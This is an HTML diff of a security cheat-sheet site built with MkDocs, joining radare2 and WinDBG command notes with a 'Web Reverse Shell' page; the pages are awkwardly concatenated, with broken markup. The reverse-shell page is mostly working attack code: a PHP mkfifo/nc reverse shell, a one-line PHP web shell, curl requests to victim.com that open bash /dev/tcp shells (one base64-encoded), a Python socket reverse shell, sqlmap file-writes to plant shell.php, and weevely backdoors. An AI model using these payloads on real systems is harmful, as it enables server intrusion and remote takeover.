+</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a>is
+</span><span id="__span-69-12"><a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a>
+</span><span id="__span-69-13"><a id="__codelineno-69-13" name="__codelineno-69-13" href="#__codelineno-69-13"></a><span class="c1"># List strings</span>
+</span><span id="__span-69-14"><a id="__codelineno-69-14" name="__codelineno-69-14" href="#__codelineno-69-14"></a>&gt;<span class="w"> </span>iz
+</span><span id="__span-69-15"><a id="__codelineno-69-15" name="__codelineno-69-15" href="#__codelineno-69-15"></a><span class="c1"># List strings in whole binary</span>
+</span><span id="__span-69-16"><a id="__codelineno-69-16" name="__codelineno-69-16" href="#__codelineno-69-16"></a>&gt;<span class="w"> </span>izz
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="reopen-current-file">Reopen Current File</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="c1"># Reopen current file in debug mode</span>
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>&gt;<span class="w"> </span>ood
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="sb">```</span>---
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>title:<span class="w"> </span>Upgrade<span class="w"> </span>to<span class="w"> </span>Fully<span class="w"> </span>Interactive<span class="w"> </span>TTY
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>description:<span class="w"> </span>After<span class="w"> </span>reverse<span class="w"> </span>shell,<span class="w"> </span>the<span class="w"> </span>shell<span class="w"> </span>has<span class="w"> </span>poorly<span class="w"> </span>functions,<span class="w"> </span>so<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>upgrade<span class="w"> </span>to<span class="w"> </span>more<span class="w"> </span>functional<span class="w"> </span>shell.
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>tags:
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a><span class="w">    </span>-<span class="w"> </span>Privilege<span class="w"> </span>Escalation
+</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a><span class="w">    </span>-<span class="w"> </span>Reverse<span class="w"> </span>Shell
+</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a>refs:
+</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a>date:<span class="w"> </span><span class="m">2023</span>-04-08
+</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a>draft:<span class="w"> </span><span class="nb">false</span>
+</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>---
+</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>
+</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a><span class="c1">## Upgrade</span>
+</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a>
+</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a>After<span class="w"> </span>connecting<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>shell<span class="w"> </span>with<span class="w"> </span>reverse<span class="w"> </span>shell,<span class="w"> </span>it<span class="s1">&#39;s recommended to make the shell to be more elegant.</span>
+</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a>
+</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a><span class="s1">```sh</span>
+</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a><span class="s1">python3 -c &#39;</span>import<span class="w"> </span>pty<span class="p">;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)</span><span class="s1">&#39;</span>
+</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a><span class="s1"># or</span>
+</span><span id="__span-70-21"><a id="__codelineno-70-21" name="__codelineno-70-21" href="#__codelineno-70-21"></a><span class="s1">python -c &#39;</span>import<span class="w"> </span>pty<span class="p">;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)</span><span class="s1">&#39;</span>
+</span><span id="__span-70-22"><a id="__codelineno-70-22" name="__codelineno-70-22" href="#__codelineno-70-22"></a><span class="s1"># or</span>
+</span><span id="__span-70-23"><a id="__codelineno-70-23" name="__codelineno-70-23" href="#__codelineno-70-23"></a><span class="s1">python2 -c &#39;</span>import<span class="w"> </span>pty<span class="p">;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)</span><span class="err">&#39;</span>
+</span><span id="__span-70-24"><a id="__codelineno-70-24" name="__codelineno-70-24" href="#__codelineno-70-24"></a><span class="c1"># or</span>
+</span><span id="__span-70-25"><a id="__codelineno-70-25" name="__codelineno-70-25" href="#__codelineno-70-25"></a><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
+</span></code></pre></div>
+<p>The commands below make our shell even more perfect.</p>
+<h2 id="ctrlz-stty-raw-echofg-enter-x2-export-termxterm"><div class="language-sh highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>Ctrl+z
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="nb">fg</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>Enter<span class="w"> </span>x2
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</span></code></pre></div></h2>
+<p>title: Web Reverse Shell
+description: We can get a shell by putting the reverse shell payload into target website.
+tags:
+    - Privilege Escalation
+    - Reverse Shell
+    - Web
+refs:
+date: 2023-11-21
+draft: false</p>
+<hr />
+<h2 id="php-reverse-shell-linux">PHP Reverse Shell (Linux)</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="c1"># From local script (it&#39;s stored by default in Kali or Parrot)</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>cp<span class="w"> </span>/usr/share/webshell/php/php-reverse-shell.php<span class="w"> </span>./shell.php
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="c1"># From repo (https://github.com/pentestmonkey/php-reverse-shell)</span>
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php<span class="w"> </span>-O<span class="w"> </span>shell.php
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="c1"># From repo (https://github.com/flozz/p0wny-shell)</span>
+</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php<span class="w"> </span>-O<span class="w"> </span>shell.php
+</span></code></pre></div>
+<p>Replace the <strong><code>$ip</code></strong> and the <strong><code>$port</code></strong> in the script with your local ip and port.  </p>
+<h3 id="without-fsockopen-and-for-freebsd">Without fsockopen, and for FreeBSD</h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;10.0.0.1&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a><span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>      <span class="c1">// CHANGE THIS</span>
+</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>
+</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a><span class="c1">// Spawn shell process</span>
+</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a><span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
+</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a><span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
+</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a><span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/error-output.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
+</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11" href="#__codelineno-73-11"></a><span class="p">);</span>
+</span><span id="__span-73-12"><a id="__codelineno-73-12" name="__codelineno-73-12" href="#__codelineno-73-12"></a>
+</span><span id="__span-73-13"><a id="__codelineno-73-13" name="__codelineno-73-13" href="#__codelineno-73-13"></a><span class="nv">$cwd</span> <span class="o">=</span> <span class="s2">&quot;/tmp&quot;</span><span class="p">;</span>
+</span><span id="__span-73-14"><a id="__codelineno-73-14" name="__codelineno-73-14" href="#__codelineno-73-14"></a><span class="nv">$env</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;some_option&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;aeiou&#39;</span><span class="p">);</span>
+</span><span id="__span-73-15"><a id="__codelineno-73-15" name="__codelineno-73-15" href="#__codelineno-73-15"></a>
+</span><span id="__span-73-16"><a id="__codelineno-73-16" name="__codelineno-73-16" href="#__codelineno-73-16"></a><span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">,</span> <span class="nv">$env</span><span class="p">);</span>
+</span><span id="__span-73-17"><a id="__codelineno-73-17" name="__codelineno-73-17" href="#__codelineno-73-17"></a>
+</span><span id="__span-73-18"><a id="__codelineno-73-18" name="__codelineno-73-18" href="#__codelineno-73-18"></a><span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-73-19"><a id="__codelineno-73-19" name="__codelineno-73-19" href="#__codelineno-73-19"></a>    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">&#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $ip $port &gt;/tmp/f&#39;</span><span class="p">);</span>
+</span><span id="__span-73-20"><a id="__codelineno-73-20" name="__codelineno-73-20" href="#__codelineno-73-20"></a>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span id="__span-73-21"><a id="__codelineno-73-21" name="__codelineno-73-21" href="#__codelineno-73-21"></a>
+</span><span id="__span-73-22"><a id="__codelineno-73-22" name="__codelineno-73-22" href="#__codelineno-73-22"></a>    <span class="k">echo</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span id="__span-73-23"><a id="__codelineno-73-23" name="__codelineno-73-23" href="#__codelineno-73-23"></a>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span id="__span-73-24"><a id="__codelineno-73-24" name="__codelineno-73-24" href="#__codelineno-73-24"></a>
+</span><span id="__span-73-25"><a id="__codelineno-73-25" name="__codelineno-73-25" href="#__codelineno-73-25"></a>    <span class="nv">$return_value</span> <span class="o">=</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+</span><span id="__span-73-26"><a id="__codelineno-73-26" name="__codelineno-73-26" href="#__codelineno-73-26"></a>    <span class="k">echo</span> <span class="s2">&quot;command returned </span><span class="si">$return_value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span id="__span-73-27"><a id="__codelineno-73-27" name="__codelineno-73-27" href="#__codelineno-73-27"></a><span class="p">}</span>
+</span><span id="__span-73-28"><a id="__codelineno-73-28" name="__codelineno-73-28" href="#__codelineno-73-28"></a><span class="cp">?&gt;</span>
+</span></code></pre></div>
+<h3 id="using-web-shell">Using Web Shell</h3>
+<p>Create a PHP script to allow us to execute arbitrary command.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;test&#39;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;
+</span></code></pre></div>
+<p>Then upload it to target website.<br />
+Now we might be able to execute arbitrary command, in short, reverse shell as below.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>curl<span class="w"> </span>https://victim.com/uploads/shell.php?test<span class="o">=</span><span class="s1">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;&#39;</span>
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a><span class="c1"># Base64 encoded payload</span>
+</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>curl<span class="w"> </span>https://victim.com/uploads/shell.php?test<span class="o">=</span><span class="s1">&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEi | base64 -d | bash&#39;</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="php-revese-shell-windows">PHP Revese Shell (Windows)</h2>
+<p>Below are the available payloads.</p>
+<ul>
+<li><a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php">https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</a></li>
+<li><a href="https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php">https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse Shell.php</a></li>
+</ul>
+<p><br /></p>
+<h2 id="python-reverse-shell-linux">Python Reverse Shell (Linux)</h2>
+<p>It's required to upload a payload and command execution in the target website for successful.<br />
+First, create a Python file e.g. <strong>"revshell.py"</strong>.  Replace the ip and the port with your own.</p>
+<div class="language-py highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="c1"># revshell.py</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="mi">4444</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
+</span></code></pre></div>
+<p>Then upload it to the target website.<br />
+Next start a listener in local machine.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p>Now we need to command execution by somehow in the target website.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>python3<span class="w"> </span>/path/to/revshell.py
+</span></code></pre></div>
+<p>If success, we should get a shell.</p>
+<p><br /></p>
+<h2 id="aspnet">ASP.NET</h2>
+<p>We can use <strong><code>.aspx</code></strong> file for reverse shell.
+Download from <a href="https://github.com/borjmz/aspx-reverse-shell">here</a>.</p>
+<p><br /></p>
+<h2 id="upload-script-via-sqli">Upload Script via SQLi</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="c1"># req.txt: The request settings file which is saved using Burp Suite</span>
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>req.txt<span class="w"> </span>--dbs<span class="w"> </span>--random-agent<span class="w"> </span>--batch<span class="w"> </span>--file-dest<span class="o">=</span>/var/www/html/shell.php<span class="w"> </span>--file-write<span class="o">=</span>./shell.php
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="useful-tools">Useful Tools</h2>
+<ul>
+<li>
+<p><strong><a href="https://github.com/epinna/weevely3">Weevely3</a></strong></p>
+<p>A web shell generator.</p>
+<ol>
+<li>
+<p><strong>Generate Backdoor with Password</strong></p>
+<p>Credentials required.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>weevely<span class="w"> </span>generate<span class="w"> </span>&lt;password&gt;<span class="w"> </span>./shell.php
+</span></code></pre></div>
+</li>
+<li>
+<p><strong>Upload the Payload to Target Website and Execute Commands</strong></p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>weevely<span class="w"> </span>https://vulnerable.com/upload/shell.php<span class="w"> </span>&lt;password&gt;<span class="w"> </span>whoami
+</span></code></pre></div>
+</li>
+<li>
+<p><strong>Get a Shell</strong></p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>weevely<span class="w"> </span>https://vulnerable.com/upload/shell.php<span class="w"> </span>&lt;password&gt;
+</span></code></pre></div>
+</li>
+</ol>
+</li>
+</ul>
+<p><br /></p>
+<h2 id="shell-script-remote-code-execution-rce">Shell Script &amp; Remote Code Execution (RCE)</h2>
+<p>If we can find a website is vulnerable to Remote Code Execution but cannot Reverse Shell, we may be able to do that by uploading the script.</p>
+<h3 id="1-create-a-shell-script-to-reverse-shell">1. Create a shell script to reverse shell.</h3>
+<p>This file is named "revshell.sh".</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="ch">#!/bin/bash</span>
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/&lt;local-ip&gt;/&lt;local-port&gt;<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></code></pre></div>
+<h3 id="2-upload-the-script-to-website">2. Upload the script to website</h3>
+<p>Start web server in local machine to upload the script.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</span></code></pre></div>
+<p>Then upload it by remote code execution in target website.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>https://vulnerable.com/?cmd<span class="o">=</span>wget<span class="w"> </span>http://&lt;local-ip&gt;:8000/revshell.sh
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="c1"># or</span>
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a>https://vulnerable.com/?cmd<span class="o">=</span>curl<span class="w"> </span>&lt;local-ip&gt;:8000/revshell.sh
+</span></code></pre></div>
+<p>To confirm the script uploaded, execute the following RCE.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>https://vulnerable.com/?cmd<span class="o">=</span>ls
+</span></code></pre></div>
+<h3 id="3-get-a-shell">3. Get a shell</h3>
+<p>Start listener for getting a shell in local machine.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p>Now execute the uploaded script via RCE.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="c1"># 1. Change permission for the script</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>https://vulenrable.com/?cmd<span class="o">=</span>chmod<span class="w"> </span><span class="m">777</span><span class="w"> </span>revshell.sh
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="c1"># 2. Execute the script</span>
+</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a>https://vulnerable.com/?cmd<span class="o">=</span>./revshell.sh
+</span></code></pre></div>
+<p>We should now get the target shell.---
+title: WinDBG Cheat Sheet
+description: 
+tags:
+    - Reverse Engineering
+refs:
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="common">Common</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="c1"># Get PEB (Process Environment Block)</span>
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>!peb
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>
+</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a><span class="c1"># Display stack backtrace</span>
+</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a>kv
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="dt-display-type">dt (Display Type)</h2>
+<p>Display fields and values.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="c1"># TEB (Thread Environment Block)</span>
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>dt<span class="w"> </span>_teb
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>
+</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a><span class="c1"># PEB (Process Environment Block)</span>
+</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>dt<span class="w"> </span>_peb
+</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a><span class="c1"># @$peb: Refer to the PEB of the current process.</span>
+</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>dt<span class="w"> </span>_peb<span class="w"> </span>@<span class="nv">$peb</span>
+</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a>
+</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a><span class="c1"># LDR</span>
+</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a>dt<span class="w"> </span>_PEB_LDR_DATA
+</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a><span class="c1"># poi: Dereference</span>
+</span><span id="__span-90-12"><a id="__codelineno-90-12" name="__codelineno-90-12" href="#__codelineno-90-12"></a>dt<span class="w"> </span>_PEB_LDR_DATA<span class="w"> </span>poi<span class="o">(</span>@<span class="nv">$peb</span>+0x123<span class="o">)</span>
+</span><span id="__span-90-13"><a id="__codelineno-90-13" name="__codelineno-90-13" href="#__codelineno-90-13"></a>dt<span class="w"> </span>_LDR_DATA_TABLE_ENTRY
+</span><span id="__span-90-14"><a id="__codelineno-90-14" name="__codelineno-90-14" href="#__codelineno-90-14"></a>dt<span class="w"> </span>_LDR_DATA_TABLE_ENTRY<span class="w"> </span>0x123
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="evaluate-expression">? (Evaluate Expression)</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>?<span class="w"> </span>poi<span class="o">(</span>@<span class="nv">$peb</span>+0x123<span class="o">)</span>
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/reverseengineering.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
